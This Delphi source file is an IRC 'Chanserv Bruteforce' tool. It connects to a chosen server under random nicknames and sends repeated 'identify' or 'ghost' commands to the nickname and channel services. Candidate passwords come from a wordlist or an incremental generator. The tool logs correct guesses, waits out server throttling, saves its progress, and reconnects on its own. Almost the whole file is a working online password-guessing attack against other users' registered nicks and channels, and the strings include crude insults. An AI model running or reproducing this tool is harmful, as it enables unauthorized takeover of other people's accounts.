   unit Unit1;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, ComCtrls, StdCtrls, ExtCtrls, ScktComp, winsock, Spin;

   type
     TForm1 = class(TForm)
       Label1: TLabel;
       Label2: TLabel;
       Edit2: TEdit;
       Label3: TLabel;
       Edit3: TEdit;
       Label4: TLabel;
       Edit4: TEdit;
       Label5: TLabel;
       Edit5: TEdit;
       CheckBox1: TCheckBox;
       CheckBox2: TCheckBox;
       TrackBar1: TTrackBar;
       Label7: TLabel;
       Panel1: TPanel;
       Button1: TButton;
       Button2: TButton;
       Button3: TButton;
       irc: TClientSocket;
       ProgressBar1: TProgressBar;
       ComboBox1: TComboBox;
       Timer1: TTimer;
       Label8: TLabel;
       SpinEdit1: TSpinEdit;
       SpinEdit2: TSpinEdit;
       Label9: TLabel;
       C_Nickk: TRadioButton;
       C_Chann: TRadioButton;
       Button4: TButton;
       RadioGroup1: TRadioGroup;
       procedure TrackBar1Change(Sender: TObject);
       procedure Button3Click(Sender: TObject);
       procedure Button1Click(Sender: TObject);
       Procedure Status(s:string;cool:boolean);
       procedure ircConnect(Sender: TObject; Socket: TCustomWinSocket);
       procedure ircRead(Sender: TObject; Socket: TCustomWinSocket);

       procedure Button2Click(Sender: TObject);
       procedure FormCreate(Sender: TObject);
       procedure ircError(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure ircDisconnect(Sender: TObject; Socket: TCustomWinSocket);
       procedure ComboBox1Change(Sender: TObject);
       procedure Timer1Timer(Sender: TObject);
       procedure Button4Click(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   var
     Form1: TForm1;
     brutef:boolean;
     Gris:thandle;
     C_serv,
     C_text,
     C_port,
     c_name,
     C_pass,
     C_chan,
     C_String,
     C_nick :string;
    MAX:integer;
    MIN:integer;
    STR:string;
    ABC:string;
    Last:string;
    First:string;
    I:Integer;
    CR:string;
    LS:string;
     iG,j:integer;
     C_jc,
     C_rf   :boolean;
     C_sleep:integer;
   implementation

   uses Unit2;

   {$R *.dfm}

   procedure TForm1.TrackBar1Change(Sender: TObject);
   begin
   label7.caption := 'Sleep ('+inttostr(trackbar1.Position)+') Second';
   end;

   procedure TForm1.Button3Click(Sender: TObject);
   begin
   messagebox(0,pchar('Chanserv Bruteforce made by SiC. http://www.imafraid.com'+#13#10+'Thx to Da`grEAt`1 for passing the joint'+#13#10+'fuck #uop @ dalnet'),'about',mb_ok);
   end;

   Procedure TForm1.Status(s:string;cool:boolean);
   begin
    if cool then
    form2.Memo1.Lines.Add(s)
    else
    form2.label2.Caption := s;
   end;

   procedure TForm1.Button1Click(Sender: TObject);
   var
    f:textfile;
    addit:boolean;
    i:integer;
   begin
    brutef := true;
     status('Setup settings',false);
     C_serv  := combobox1.Text;
     C_text  := edit4.text;
     button2.Enabled := true;
     button1.Enabled := false;
     C_port  := edit5.text;
     C_chan  := edit3.text;
     C_Nickk.Enabled := false;
     C_Chann.Enabled := false;
     C_nick  := edit2.text;
     C_jc    := checkbox1.Checked;
     C_rf    := checkbox2.Checked;
     C_sleep := (trackbar1.Position*1000);
     edit4.enabled := false;
     edit5.enabled := false;
     edit3.enabled := false;
     edit2.enabled := false;
     SpinEdit1.Enabled := false;
     SpinEdit2.Enabled := false;
     checkbox1.enabled := false;
     checkbox2.enabled := false;
     trackbar1.enabled := false;
     combobox1.enabled := false;

     Status('Saving',false);

     assignfile(f,combobox1.text+'.dat');
     rewrite(f);
     writeln(f, edit5.text);
     writeln(f, edit3.text);
     writeln(f, edit4.text);
     writeln(f, edit2.text);
     if checkbox1.checked then
     writeln(f, 'y') else writeln(f,'f');
     if checkbox2.checked then
     writeln(f, 'y') else writeln(f,'f');
     writeln(f, inttostr(trackbar1.Position));
     writeln(f, inttostr(iG));
     writeln(f, inttostr(spinedit1.Value));
     writeln(f, inttostr(spinedit2.Value));
     if C_Nickk.Checked then
      writeln(f, 'y') else writeln(f, 'f');
     if C_Chann.Checked then
      writeln(f, 'y') else writeln(f, 'f');
   if str = '' then
     writeln(f, 'a') else writeln(f, str);
     writeln(f,inttostr(form1.RadioGroup1.ItemIndex));
     closefile(f);
   addit:=true;
     for i:=0 to combobox1.Items.Count -1 do
      if ansilowercase(combobox1.Items.Strings[i]) = ansilowercase(c_serv) then addit:=falsE;
     if addit then combobox1.Items.Add(ansilowercase(c_serv));

     assignfile(f, 'Servers.dat');
     rewrite(f);
     for i:=0 to combobox1.items.count -1 do begin
      writeln(f, ansilowercase(combobox1.Items.Strings[i]));
     end;
     closefile(f);
     status('Starting iRC bot',false);
     if irc.Active then irc.Active := false;

     irc.Host := c_Serv;
     irc.port := strtoint(C_port);
     irc.active := true;

   end;

   procedure Sle(f:integer);
   var g,gg:integer;
   begin
   if f = 0 then exit;
   form1.progressbar1.Position := 0;
   form1.progressbar1.Min := 0;
   form1.progressbar1.Max := F;
   g := f;
   gg := (g div 100);
   while f>0 do begin
   if f = g-gg then begin
   //form1.Status('.',false);
   g:=f;
   end;
   form1.Update;
   form2.Update;
   sleep(1);
   f:=f-1;
   form1.progressbar1.Position := form1.progressbar1.Position +1;
   end;
   form1.progressbar1.Position := 0;
   end;

   Function Rand:string;
   var
    abc:string;
   begin
   randomize;
    abc:='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_-|^\[]{}';
    result := '';
    while length(result) < 12 do begin
     sleep(80);
     result := result + copy(abc,random(length(abc)),1);
    end;
   end;

   procedure Brute;
   var
    send01:string;
    b:textfile;
    L1,L2:string;
    str01:string;
    target:string;
    t:longword;
    f:textfile;
   begin
   j:=0;
    if (c_text <> '') and fileexists(c_text) then begin
     assignfile(b, c_text);
     reset(b);
     read(b, L1);
     readln(b, l2);
     c_pass := L1;
     if iG=0 then begin
        if form1.C_Nickk.Checked then
         send01:=('PRIVMSG '+c_nick+' :ghost '+c_chan+' '+L1+#13#10)
        else
         send01:=('PRIVMSG '+c_nick+' :identify '+c_chan+' '+L1+#13#10);
     form1.irc.socket.sendtext(send01);
      Form1.Status('testing '+l1, true);
     c_string:='';
     while c_string = '' do begin
      ;
     end;
     sle(C_Sleep);
     end;
     while not eof(b) do begin
      read(b, L1);
      readln(b, l2);
      c_pass := L1;
     if j = iG then begin
        if form1.C_Nickk.Checked then
         send01:=('PRIVMSG '+c_nick+' :ghost '+c_chan+' '+L1+#13#10)
        else
         send01:=('PRIVMSG '+c_nick+' :identify '+c_chan+' '+L1+#13#10);
      form1.irc.socket.sendtext(send01);
      Form1.Status('testing '+l1, true);
     c_string:='';
     while c_string = '' do begin
      ;
     end;
     iG:=iG+1;
     j:=j+1;

     assignfile(f,form1.combobox1.text+'.dat');
     rewrite(f);
     writeln(f, form1.edit5.text);
     writeln(f, form1.edit3.text);
     writeln(f, form1.edit4.text);
     writeln(f, form1.edit2.text);
     if form1.checkbox1.checked then
     writeln(f, 'y') else writeln(f,'f');
     if form1.checkbox2.checked then
     writeln(f, 'y') else writeln(f,'f');
     writeln(f, inttostr(form1.trackbar1.Position));
     writeln(f, inttostr(iG));
     writeln(f, inttostr(form1.spinedit1.Value));
     writeln(f, inttostr(form1.spinedit2.Value));
     if form1.C_Nickk.Checked then
      writeln(f, 'y') else writeln(f, 'f');
     if form1.C_Chann.Checked then
      writeln(f, 'y') else writeln(f, 'f');
   if str = '' then
     writeln(f, 'a') else writeln(f, str);
       writeln(f,inttostr(form1.RadioGroup1.ItemIndex));
     closefile(f);

     sle(C_Sleep);
     end else begin
      j:=j+1;
     end;
     end;
     closefile(b);
    end else begin
   if form1.RadioGroup1.ItemIndex = 2 then
   ABC:='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789|' else
   if form1.RadioGroup1.ItemIndex = 1 then
   ABC:='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ|' else
   if form1.RadioGroup1.ItemIndex = 0 then
   ABC:='0123456789|';
   MIN:=Form1.spinedit1.Value;
   MAX:=Form1.spinedit2.Value;
   Last:=ABC[length(abc)];
   First:=copy(abc,1,1);

   if (str = '') or (length(str) <> MIN) then begin
   str:='';
   For j:=1 to MIN do str := str + first;
   end;

    while Length(STR)<MAX do begin
     // Check if str < MAX and are LAST+LAST
     For j:=1 to Length(str) do LS := LS + LAST;
     if (str = LS) and (length(str) < MAX) then begin
      For j:=1 to Length(str) do str := str + first;
      Str:=Str+First;
     end;
     // This happends when the str aint long enought.
      For I:=1 to Length(Str) do begin
       // Scan for Last Char [LAST]
       if Copy(Str,i,1) = last then begin
        // set last char:
        Cr := Copy(abc,pos(Copy(Str,i,1),ABC)+1,1);

        if {(Copy(abc,pos(Copy(Str,i,1),ABC)+1,1) = first) or}
           (Copy(abc,pos(Copy(Str,i,1),ABC)+1,1) = '') or
           (Copy(abc,pos(Copy(Str,i,1),ABC)+1,1) = last) then begin
        // Replace Z with A
        delete(str,i,1);
        insert(first,str,i);

        // set last char:
        Cr := Copy(abc,pos(Copy(Str,i-1,1),ABC)+1,1);

        // Inc Char infron of Z
        delete(str,i-1,1);
        if CR <> abc[length(abc)] then
        insert(CR,str,i-1)
        else
        // 159000
        insert(copy(abc,pos(copy(str,3,1),abc)+1,1),str,i-1);
       end;
       end;
      End;
        c_pass := str;
        form1.SpinEdit1.Value := length(str);
     assignfile(f,form1.combobox1.text+'.dat');
     rewrite(f);
     writeln(f, form1.edit5.text);
     writeln(f, form1.edit3.text);
     writeln(f, form1.edit4.text);
     writeln(f, form1.edit2.text);
     if form1.checkbox1.checked then
     writeln(f, 'y') else writeln(f,'f');
     if form1.checkbox2.checked then
     writeln(f, 'y') else writeln(f,'f');
     writeln(f, inttostr(form1.trackbar1.Position));
     writeln(f, inttostr(iG));
     writeln(f, inttostr(form1.spinedit1.Value));
     writeln(f, inttostr(form1.spinedit2.Value));
     if form1.C_Nickk.Checked then
      writeln(f, 'y') else writeln(f, 'f');
     if form1.C_Chann.Checked then
      writeln(f, 'y') else writeln(f, 'f');
   if str = '' then
     writeln(f, 'a') else writeln(f, str);
     writeln(f,inttostr(form1.RadioGroup1.ItemIndex));
     closefile(f);
     if pos('|',str)=0 then begin
        if form1.C_Nickk.Checked then
         send01:=('PRIVMSG '+c_nick+' :ghost '+c_chan+' '+str+#13#10)
        else
         send01:=('PRIVMSG '+c_nick+' :identify '+c_chan+' '+str+#13#10);
        Form1.Status('testing '+str, true);
        form1.irc.socket.sendtext(send01);
     end;
        c_string:='';
        while c_string = '' do begin
         ;
        end;
        sle(C_Sleep);
        Cr := Copy(abc,pos(Copy(Str,length(str),1),ABC)+1,1);
        delete(str,length(str),1);
        insert(CR,str,i);
      end;

    end;
   form1.status('Done',true);

   end;

   procedure TForm1.ircConnect(Sender: TObject; Socket: TCustomWinSocket);
   begin
   Status('Connected',false);
   status('Sending Info',false);
   Status('Connected',true);
   status('Sending Info',true);
   c_name := rand;
   Socket.SendText('USER '+c_name+' '+c_name+'@penis.com '+c_name+' '+c_name+#13#10);
   c_name := rand;
   Socket.SendText('NICK '+c_name+#13#10);

   end;

   function getip(iip:string):String;
   var ip:phostent;
       ipc:cardinal;
       ipa:array[1..4]of byte absolute ipc;
   begin
     ip:=winsock.gethostbyname(pchar(iip));
     if ip=nil then begin
       result:='unable to find';
       exit;
     end else begin
       ipc:=cardinal(pointer(ip^.h_addr_list^)^);
       ipc:=winsock.ntohl(ipc);
     end;
     result:=inttostr(ipa[4])+'.'+inttostr(ipa[3])+'.'+inttostr(ipa[2])+'.'+inttostr(ipa[1]);
   end;

   procedure TForm1.ircRead(Sender: TObject; Socket: TCustomWinSocket);
   var
    Apa1:longword;
    hs,str01:string;
   begin
    str01 := socket.ReceiveText;
    str01 := ansilowercase(str01);
   // Status(Str01, True);
    If pos('version', str01)>0 then
    begin
      socket.sendtext('VERSION reply mirc is penis'#13#10);
    end else
    If Pos('pong', str01)>0 then
    begin
      c_name := copy(str01, pos('pong', str01)+4, length(str01));
      c_name := copy(c_name, 1, pos(#13#10, c_name)-1);
      if pos ('/quote', str01)> 0 then
        socket.SendText('pong '+str01+#13#10)
      else
        socket.SendText('pong '+str01+#13#10);
    end else
    if (pos('nickname',str01)>0) and (pos('in use',str01)>0) then begin
    c_name := rand;
     socket.SendText('NICK '+c_name);
    end else
    if (pos('http://',str01)>0) then begin
     hs := copy(str01,pos('http://',str01),length(str01));
     hs := copy(hs,1,length(hs)-2);
     if pos(' ',hs)>0 then
      hs := copy(hs,1,pos(' ',hs)-1);
   //  socket.SendText('PRIVMSG '+c_chan+' :('+hs+') resolved to ('+getip(hs)+')'+#13#10);
    end else
    if pos('throttle',str01) > 0 then begin
     status('Throttle Connecting, waiting 30 sec.',false);
     sle(30000);
    end else
    if (pos('!DNS',str01)>0) then begin
     hs := copy(str01,pos('!DNS',str01)+4,length(str01));
     hs := copy(hs,1,length(hs)-2);
     if pos(' ',hs)>0 then
      hs := copy(hs,1,pos(' ',hs)-1);
     socket.SendText('PRIVMSG '+c_chan+' :( '+hs+' ) resolved to ( '+getip(hs)+' )'+#13#10);
    end else
    if (pos('password',str01)>0) and (pos('incorrect',str01)>0) then begin
     if C_rf then
      Status('Incorrect Password : '+C_pass,true);
      C_string := 'a';
    end else
    if (pos('password',str01)>0) and (pos('accepted',str01)>0) then begin
      Status('Correct Password : '+C_pass,true);
      C_string := 'a';
    end;
    if (pos('isn''t registered.',str01)>0) then begin
     if C_Nickk.Checked then
      status('Nickname aint registered.',true)
     else
      status('Channel aint registered.',true);
     button2click(self);
    end;
    if (pos('isn''t currently in use.',str01)>0) then begin
     if C_Nickk.Checked then
      status('Nickname aint online.',true)
     else
      status('Channel aint online.',true);
     button2click(self);
    end;
    if (pos('motd',str01)>0) then begin
     if c_JC then begin
      socket.sendtext('JOIN '+c_chan+#13#10);
      Status('Bot joined : '+C_chan,false);
     end;
   sle(2000);
   Status('Prepare Brute',false);
   Gris := CreateThread(nil,0,@brute,nil,0,APA1);

    end;
   end;

   procedure TForm1.Button2Click(Sender: TObject);
   var
     lpExitCode: DWORD;
   begin
    timer1.enabled := false;
     brutef:=false;
     GetExitCodeThread(Gris,lpExitCode);
     TerminateThread(Gris,lpExitCode);
     button1.Enabled := true;
     button2.Enabled := false;
     irc.Active := false;
   //  status('>> Stopped');
     edit4.enabled := true;
     edit5.enabled := true;
     SpinEdit1.Enabled := true;
     C_Nickk.Enabled := true;
     C_Chann.Enabled := true;
     SpinEdit2.Enabled := true;
     edit3.enabled := true;
     edit2.enabled := true;
     checkbox1.enabled := true;
     checkbox2.enabled := true;
     trackbar1.enabled := true;
     combobox1.enabled := true;
   end;

   procedure TryRead(F:string);
   var
    a:textfile;
    f1,f2:string;
    i:integer;
   begin
    if not fileexists(F) then exit;
    i:=1;
    assignfile(a,F);
    reset(a);
    read(a , f1);
    readln(a,f2);
    form1.Edit5.text := F1;
    while not eof(a) do begin
     read(a , f1);
     readln(a,f2);
     case i of
      1:form1.edit3.text := f1;
      2:form1.edit4.text := f1;
      3:form1.edit2.text := f1;
      4:if f1 = 'y' then form1.checkbox1.checked := true else form1.checkbox1.checked := false;
      5:if f1 = 'y' then form1.checkbox2.checked := true else form1.checkbox2.checked := false;
      6:form1.trackbar1.Position := strtoint(F1);
      7:iG := strtoint(F1);
      8:form1.spinedit1.Value := strtoint(F1); //edit1
      9:form1.spinedit2.Value := strtoint(F1); //edit2
      10:if f1 = 'y' then form1.c_nickk.checked := true else form1.c_nickk.checked := false; //nickk
      11:if f1 = 'y' then form1.c_chann.checked := true else form1.c_chann.checked := false; //chann
      12:str := F1; //str
      13:Form1.RadioGroup1.ItemIndex := strtoint(F1);
     end;
     i:=i+1;
    end;
    closefile(a);
   end;

   procedure TForm1.FormCreate(Sender: TObject);
   begin
   j:=0;
   iG:=0;
   if fileexists('Servers.dat') then combobox1.Items.LoadFromFile('Servers.dat');
   combobox1.text := combobox1.Items.Strings[ combobox1.Items.count-1 ];
   TryRead(combobox1.text+'.dat');
   end;

   procedure TForm1.ircError(Sender: TObject; Socket: TCustomWinSocket;
     ErrorEvent: TErrorEvent; var ErrorCode: Integer);
   begin
   errorcode := 0;
   end;

   procedure TForm1.ircDisconnect(Sender: TObject; Socket: TCustomWinSocket);
   var
     lpExitCode: DWORD;
   begin

     GetExitCodeThread(Gris,lpExitCode);
     TerminateThread(Gris,lpExitCode);
     irc.Active := false;
     status('Stopped',false);
     edit4.enabled := true;
     edit5.enabled := true;
     edit3.enabled := true;
     edit2.enabled := true;
     checkbox1.enabled := true;
     checkbox2.enabled := true;
     trackbar1.enabled := true;
     combobox1.enabled := true;

    irc.Active := false;
    if brutef then begin
    button1.Enabled := false;
   // sle(30000);
    brutef := false;
    button1.Enabled := true;
     timer1.enabled := true;
    end;
   end;

   procedure TForm1.ComboBox1Change(Sender: TObject);
   begin
   if fileexists(combobox1.Text+'.dat') then begin
    tryread(combobox1.text+'.dat');
   end;
   end;

   procedure TForm1.Timer1Timer(Sender: TObject);
   begin
    button1click(self);
    timer1.Enabled := false;
   end;

   procedure TForm1.Button4Click(Sender: TObject);
   begin
   if not form2.Showing then form2.Show else form2.hide;
   end;

   end.
